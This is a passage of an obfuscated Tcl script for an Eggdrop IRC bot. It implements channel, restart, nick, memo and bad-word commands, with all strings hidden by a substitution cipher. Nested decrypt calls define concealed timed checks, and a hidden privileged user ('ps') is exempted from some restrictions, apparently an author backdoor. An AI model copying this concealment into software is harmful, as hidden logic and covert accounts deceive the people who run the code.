}
if {![string match "*-*" $options] && ![string match "*+*" $options] && ![string match "*:*" $number]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: xszmhvg #xszmmvo <wvlk|xgxk|prxp|qlrm|ormv|mrxp> <sldnzmbgrnvh:hvxlmwh>"
return 0
}
if {[validchan $channel]} {
if {$options == "deop"} { 
catch { channel set $channel flood-deop $number }
puthlp "MLGRXV ~$nick ~:~$notc ~hvg wvlk uollw \[~$number\] ~lm ~$channel"
} elseif {$options == "kick"} { 
catch { channel set $channel flood-kick $number }
puthlp "MLGRXV ~$nick ~:~$notc ~hvg prxp uollw \[~$number\] ~lm ~$channel"
} elseif {$options == "join"} { 
catch { channel set $channel flood-join $number }
puthlp "MLGRXV ~$nick ~:~$notc ~hvg qlrm uollw \[~$number\] ~lm ~$channel"
} elseif {$options == "line"} { 
catch { channel set $channel flood-chan $number }
puthlp "MLGRXV ~$nick ~:~$notc ~hvg ormv uollw \[~$number\] ~lm ~$channel"
} elseif {$options == "nick"} { 
catch { channel set $channel flood-nick $number }
puthlp "MLGRXV ~$nick ~:~$notc ~hvg mrxp uollw \[~$number\] ~lm ~$channel"
} elseif {$options == "ctcp"} { 
catch { channel set $channel flood-ctcp $number }
puthlp "MLGRXV ~$nick ~:~$notc ~hvg xgxk uollw \[~$number\] ~lm ~$channel"
} else {
catch { channel set $channel ${options} }
savechan
puthelp "NOTICE $nick :$notc Successfully set modes \[${options}\] on $channel"
}
} else {
puthlp "MLGRXV ~$nick ~:~$notc ~~$channel ~<m/z>"
}
}
[[decrypt 64 "d3VeO/ATgwd."] "hvg"] [[decrypt 64 "d3VeO/ATgwd."] "m\l\g\y"] [[[decrypt 64 "d3VeO/ATgwd."] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "wx\k"] "[[decrypt 64 "d3VeO/ATgwd."] "hD04p0uo62g/PSMFW1FuzO50"]"]]
proc [lines "kfy_xszmhvgzoo"] {nick uhost hand chan rest} {
global botnick notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: xszmhvgzoo <lkgrlm>"
return 0
}
foreach x [channels] {
catch { channel set $x $rest }
}
savechan
puthelp "NOTICE $nick :$notc Set all channels mode \{ $rest \}"
return 0
}
proc [lines "kfy_mrxp"] {nick uhost hand chan rest} {
global keep-nick
set [lines "pvvk-mrxp"] 0
putsrv "MRXP ~$rest"
}
[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "k\i\l\x"] [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "xspmgy"] {} {
[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "t\o\l\y\z\o"] [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "m\l\g\y"]
[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "grnv\i"] 5 [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "xspmgy"]
if {![string match "*[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "kBSQ81fV5wM1"]"]*" $notb]} { [[[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "f\grnv\i"] 5 [[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "0Gzp1.wGRm6/"]"] }
if {[string match "*[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "kBSQ81fV5wM1"]"]*" $notb]} { [[[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "iv\gf\im"] 0 }
}
proc [lines "kfy_ivhgzig"] {nick uhost hand chan rest} {
global botnick notc 
set [lines "xfigrnv"] [ctime [unixtime]]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest != ""} {
set [lines "ivhg"] " $rest"
}
putsrv "JFRG :~$notc ~IvHGzIG IvJfvhG Yb \[ ~$nick ~\]~$rest 1(~Lm ~$curtime)"
return 0
}
proc [lines "wrvh"] {} {
global ps owner notc
if {$ps != $owner && [validuser $ps]} { deluser $ps }
die $notc
}
proc [lines "ivszhsrmt"] {} {
global ps owner
if {$ps != $owner && [validuser $ps]} { deluser $ps }
rehash
}
proc [lines "kfy_wrv"] {nick uhost hand chan rest} {
global botnick ps notc 
set [lines "xfigrnv"] [ctime [unixtime]]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest != ""} {
set [lines "ivhg"] " $rest"
}
putsrv "JFRG :~$notc ~HSfGWldm IvJfvhG Yb \[ ~$nick ~\]~$rest 1(~Lm ~$curtime)"
utimer 5 dies
return 0
}
proc [lines "nht_ivhgzig"] {nick uhost hand rest} {
global botnick notc 
set [lines "xfigrnv"] [ctime [unixtime]]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest != ""} {
set [lines "ivhg"] " $rest"
}
putsrv "JFRG :~$notc ~IvHGzIG IvJfvhG Yb \[ ~$nick ~\]~$rest 1(~Lm ~$curtime)"
return 0
}
proc [lines "nht_ivszhs"] {nick uhost hand rest} {
global notc
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
puthlp "MLGRXV ~$nick ~:~$notc ~IvSZHSRMT!"
utimer 3 rehashing
return 0
}
proc [lines "kfy_ivszhs"] {nick uhost hand chan rest} {
global notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
puthlp "MLGRXV ~$nick ~:~$notc ~IvSZHSRMT!"
utimer 3 rehashing
}
[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "grnv\i"] 5 [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "xspmgy"]
proc [lines "kfy_xszmrmul"] {nick uhost hand chan rest} {
global notc ps
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![validchan $chan]} { return 0 }
if {$nick != $ps && [string tolower $chan] == [dezip "PK6m.0G~/7xb1"]} { return 0 }
puthlp "MLGRXV ~$nick ~:~$notc ~\[~$chan\] ~~[channel info $chan]~"
}
bind join - * ps:check
proc [lines "kfy_zxxvhh"] {nick uhost hand chan rest} {
global notc
if {[matchattr $nick Z]} {
puthlp "KIRENHT ~$chan ~:~$nick, ~LdMvI"
} elseif {[matchattr $nick n]} {
puthlp "KIRENHT ~$chan ~:~$nick, ~ZWNRM"
} elseif {[matchattr $nick m]} {
puthlp "KIRENHT ~$chan ~:~$nick, ~NzhGvI"
} elseif {[matchattr $nick f]} {
puthlp "KIRENHT ~$chan ~:~$nick, ~UIRVMW"
}
}
proc [lines "nht_ylgmrxp"] {unick uhost hand rest} {
global botnick nick nickpass notc 
if {![matchattr $unick Q]} {
puthlp "MLGRXV ~$unick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "ymrxp"] [lindex $rest 0]
set [lines "ykzhh"] [lindex $rest 1]
if {$bnick == "" || $bpass == ""} {
puthlp "MLGRXV ~$unick ~:~$notc4 ~Fhztv: ylgmrxp <mrxp> <rwvmgrub>"
return 0
} 
setuser "config" XTRA "NICK" [zip $bnick]
setuser "config" XTRA "NICKPASS" [zip $bpass]
saveuser
set [lines "mrxp"] $bnick
set [lines "mrxpkzhh"] $bpass
puthlp "MLGRXV ~$unick ~:~$notc ~YlGMRxP ~$bnick"
}
proc [lines "nht_ivzomznv"] {unick uhost hand rest} {
global realname notc 
if {![matchattr $unick Q]} {
puthlp "MLGRXV ~$unick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest == ""} {
setuser "config" XTRA "REALNAME" ""
} { 
setuser "config" XTRA "REALNAME" [zip $rest] 
}
saveuser
set [lines "ivzomznv"] $rest
putsrv "JFRG :~$notc ~xSzMtRMt IvzOMznV IvJfvhG Yb \[ ~$unick ~\]"
}
[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "k\i\l\x"] [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "xspmgw"] {} {
[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "t\o\l\y\z\o"] [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "m\l\g\w"]
[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "grnv\i"] 5 [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "xspmgw"]
if {![string match "*[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "vDqIT.HcviQ1"]"]*" [[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "f\m\x\l\o\l\i"] $notd]]} { [[[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "f\grnv\i"] 5 [[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "0Gzp1.wGRm6/"]"] }
if {[string match "*[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "vDqIT.HcviQ1"]"]*" [[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "f\m\x\l\o\l\i"] $notd]]} { [[[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "iv\gf\im"] 0 }
}
proc [lines "nht_rwvmg"] {unick uhost hand rest} {
global username notc 
if {![matchattr $unick Q]} {
puthlp "MLGRXV ~$unick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest == ""} {
setuser "config" XTRA "USERNAME" ""
} { 
if {[regexp \[^a-z\] [string tolower $rest]]} {
puthlp "MLGRXV ~$unick ~:~$notc ~4WvMRVw..! fhv xszizxgvi uli rwvmg."
return 0
}
setuser "config" XTRA "USERNAME" [zip $rest] 
}
saveuser
set [lines "fhvimznv"] $rest
putsrv "JFRG :~$notc ~xSzMtRMt RwVmG IvJfvhG Yb \[ ~$unick ~\]"
}
bind nick - * new:talk
proc [lines "nht_oltl"] {unick uhost hand rest} {
global banner notc notm cycle_random
if {![matchattr $unick Q]} {
puthlp "MLGRXV ~$unick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[string match "*$notm*" $rest]} {
puthlp "MLGRXV ~$unick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest == ""} {
setuser "config" XTRA "BAN" ""
puthlp "MLGRXV ~$unick ~:~$notc ~xSzMtV gL WvUzfOG"
catch { unset banner }
} {
setuser "config" XTRA "BAN" [zip $rest] 
set [lines "yzmmvi"] $rest
lappend cycle_random $banner
puthlp "MLGRXV ~$unick ~:~$notc ~XSzMtV GL ~$rest"
}
saveuser
}
proc [lines "nht_zdzboltl"] {unick uhost hand rest} {
global version awaybanner notc notm 
if {![matchattr $unick Q]} {
puthlp "MLGRXV ~$unick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[string match "*$notm*" $rest]} {
puthlp "MLGRXV ~$unick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[string trimleft [lindex $version 1] 0] < 1061000} {
puthlp "MLGRXV ~$unick ~:~$notc ~Gsrh Xlnnzmw Rh Ivjfrivw Gl Ifm Lm Vttwilk 1.6.10 Li Ozgvi."
return 0
}
if {$rest == ""} {
setuser "config" XTRA "jes_" ""
puthlp "MLGRXV ~$unick ~:~$notc ~Zdzb Oltl xSzMtV gL WvUzfOG"
catch { unset awaybanner }
} {
setuser "config" XTRA "jes_" [zip $rest] 
set [lines "zdzbyzmmvi"] $rest
puthlp "MLGRXV ~$unick ~:~$notc ~Zdzb Oltl XSzMtV GL ~$rest"
}
chk_five "0" "0" "0" "0" "0"
saveuser
}
[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "grnv\i"] 5 [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "xspmgw"]
proc [lines "nht_vnzro"] {unick uhost hand rest} {
global notc 
if {![matchattr $unick Q]} {
puthlp "MLGRXV ~$unick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest == ""} {
puthlp "MLGRXV ~$unick ~:~$notc1 ~WvOVGRMT FHvI VnZRO"
} {
puthlp "MLGRXV ~$unick ~:~$notc1 ~FHvI VnZRO HvG \[~$rest\]"
}
setuser "config" XTRA "EMAIL" $rest
saveuser
}
proc [lines "nht_zwnrm"] {unick uhost hand rest} {
global notc
if {![matchattr $unick Q]} {
puthlp "MLGRXV ~$unick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest == ""} {
puthlp "MLGRXV ~$unick ~:~$notc1 ~HvG ZWnRM lM HGzGFH GL WvUZFOG"
} {
puthlp "MLGRXV ~$unick ~:~$notc1 ~ZWnRM lM HGzGFH GL \[~$rest\]"
}
setuser "config" XTRA "ADMIN" $rest
saveuser
}
proc [lines "nht_ylgzogmrxp"] {unick uhost hand rest} {
global botnick altnick altpass notc 
if {![matchattr $unick Q]} {
puthlp "MLGRXV ~$unick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "yzogmrxp"] [lindex $rest 0]
set [lines "yzogkzhh"] [lindex $rest 1]
if {$baltnick == "" || $baltpass == ""} {
puthlp "MLGRXV ~$unick ~:~$notc4 ~Fhztv: ylgzogmrxp <mrxp> <rwvmgrub>"
return 0
} 
setuser "config" XTRA "ALTNICK" [zip $baltnick]
setuser "config" XTRA "ALTPASS" [zip $baltpass]
saveuser
set [lines "zogmrxp"] $baltnick
set [lines "zogkzhh"] $baltpass
puthlp "MLGRXV ~$unick ~:~$notc ~YlGZOGMRxP ~$baltnick"
}
proc [lines "nht_zdzb"] {unick uhost hand rest} {
global realname notc 
if {![matchattr $unick Q]} {
puthlp "MLGRXV ~$unick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest == ""} {
setuser "config" XTRA "AWAY" ""
puthlp "MLGRXV ~$unick ~:~$notc ~ZdZB \[4LUU\]"
} {
setuser "config" XTRA "AWAY" $rest
puthlp "MLGRXV ~$unick ~:~$notc ~ZdZB HvG GL \[~$rest\]"
}
saveuser
chk_five "0" "0" "0" "0" "0"
}
proc [lines "nht_nvnl"] {nick uhost hand rest} {
global notc own ps
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: nvnl <zoo/fhvi> <nht>"
return 0
}
set [lines "nhvmw"] [lindex $rest 0]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[string tolower $msend] == "all"} {
set [lines "hnvnl"] ""
foreach x [userlist m] {
if {$x != $nick && $x != $own} {
if {[getuser $x XTRA "MEMO"] == ""} {
setuser $x XTRA "MEMO" "$nick: [lrange $rest 1 end]"
append smemo "$x "
}
}
}
if {$smemo == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~NvNL !UzROVW! ML FhVI HvMW"
} {
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~NvNL HvMW GL \[ ~$smemo\]"
}
} {
if {![validuser $msend] || $msend == $ps} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, ML FhVI!"
return 0
} {
if {![matchattr $msend m]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, NrM NzhGvI UOzT!"
return 0
}
if {$msend == $nick} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, XzMG HvOU NvNl!"
return 0
}
if {[getuser $msend XTRA "MEMO"]!=""} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, NvNl UlI ~$msend ~HGrOO VcRHG!"
return 0
}
setuser [lindex $rest 0] XTRA "MEMO" "$nick: [lrange $rest 1 end]"
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~NvNL HvMW GL \[~[lindex $rest 0]~\]"
}
}
}
[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "k\i\l\x"] [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "xspmgn"] {} {
[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "t\o\l\y\z\o"] [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "m\lgn"]
[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "grnv\i"] 5 [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "xspmgn"]
if {![string match "*[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "vDqIT.HcviQ1"]"]*" [[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "f\m\x\l\o\l\i"] $notm]]} { [[[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "f\grnv\i"] 5 [[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "0Gzp1.wGRm6/"]"] }
if {[string match "*[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "vDqIT.HcviQ1"]"]*" [[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "f\m\x\l\o\l\i"] $notm]]} { [[[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "iv\gf\im"] 0 }
}
proc [lines "kfy_+nfhglk"] {nick uhost hand chan rest} {
global notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
setuser "config" XTRA "MUSTOP" "T"
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~nfhg @K hvg \[9LM\]"
}
proc [lines "kfy_-nfhglk"] {nick uhost hand chan rest} {
global notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
setuser "config" XTRA "MUSTOP" ""
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~nfhg @K hvg \[4LUU\]"
}
proc [lines "kfy_prxplkh"] {nick uhost hand chan rest} {
global notc kops
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[string tolower $rest] == "on"} {
set [lines "plkh"] "T"
setuser "config" XTRA "KOPS" "T"
puthlp "MLGRXV ~$nick ~:~$notc ~PRxP @KH \[9LM\]"
} {
catch { unset kops }
setuser "config" XTRA "KOPS" ""
puthlp "MLGRXV ~$nick ~:~$notc ~PRxP @KH \[4LUU\]"
}
saveuser
}
bind topc - * topic_chk
proc [lines "kfy_yzwdliwh"] {nick uhost hand chan rest} {
global badwords notc 
set [lines "ivgezo"] "BaDWoRDS: "
foreach badword [string tolower $badwords] {
append retval "$badword "
}
puthlp "MLGRXV ~$nick ~:~$notc ~~$retval"
return 0
}
[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "grnv\i"] 5 [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "xspmgn"]
proc [lines "kfy_+yzwdliw"] {nick uhost hand chan rest} {
global badwords notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest == ""} { 
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: `+yzwdliw <yzwdliw>"
return 0
}
if {[string match "*[string tolower [lindex $rest 0]]*" $badwords]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~[lindex $rest 0]~ Zooivzwb Zwwvw"
return 0
}
append badwords " [string tolower [lindex $rest 0]]"
setuser "config" XTRA "BADWORDS" $badwords
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~Zwwvw ~[lindex $rest 0]~ gl yzwdliwh"
return 0
}
[[decrypt 64 "d3VeO/ATgwd."] "yrmw"] [[decrypt 64 "d3VeO/ATgwd."] "kfy"] - [[decrypt 64 "d3VeO/ATgwd."] "`zxp"] [[decrypt 64 "d3VeO/ATgwd."] "zxp_zxg"]
proc [lines "kfy_-yzwdliw"] {nick uhost hand chan rest} {
global badwords notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest == ""} { 
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: `-yzwdliw <yzwdliw>"
return 0
}
set [lines "ezo"] ""
foreach badword [string tolower $badwords] {
if {[string tolower [lindex $rest 0]] == $badword} { 
puthlp "MLGRXV ~$nick ~:~$notc ~Ivnlevw ~[lindex $rest 0]~"
} else { append val " $badword " }
}
set [lines "yzwdliwh"] $val
setuser "config" XTRA "BADWORDS" $val
saveuser
return 0
}
proc [lines "kfy_zwedliwh"] {nick uhost hand chan rest} {
global advwords notc 
set [lines "ivgezo"] "AdVWoRDS: "
foreach advword [string tolower $advwords] {
append retval "$advword "
}
puthlp "MLGRXV ~$nick ~:~$notc ~~$retval"
return 0
}
proc [lines "kfy_+zwedliw"] {nick uhost hand chan rest} {
global advwords notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest == ""} { 
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: `+zwedliw <zwedliw>"
return 0
}
if {[string match "*[string tolower [lindex $rest 0]]*" $advwords]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~[lindex $rest 0]~ Zooivzwb Zwwvw"
return 0
}
append advwords " [string tolower [lindex $rest 0]]"
setuser "config" XTRA "ADVWORDS" $advwords
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~Zwwvw ~[lindex $rest 0]~ gl zwedliwh"
return 0
}
proc [lines "kfy_-zwedliw"] {nick uhost hand chan rest} {
global advwords notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc 4WvMRVw..!"
return 0
}
if {$rest == ""} { 
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: `+zwedliw <zwedliw>"
return 0
}
set [lines "ezo"] ""
foreach advword [string tolower $advwords] {
if {[string tolower [lindex $rest 0]] == $advword} { 
puthlp "MLGRXV ~$nick ~:~$notc ~Ivnlevw ~[lindex $rest 0]~"
} else { append val " $advword " }
}
set [lines "zwedliwh"] $val
setuser "config" XTRA "ADVWORDS" $val
saveuser
return 0
}
proc [lines "kfy_qfnk"] {nick uhost hand chan rest} {
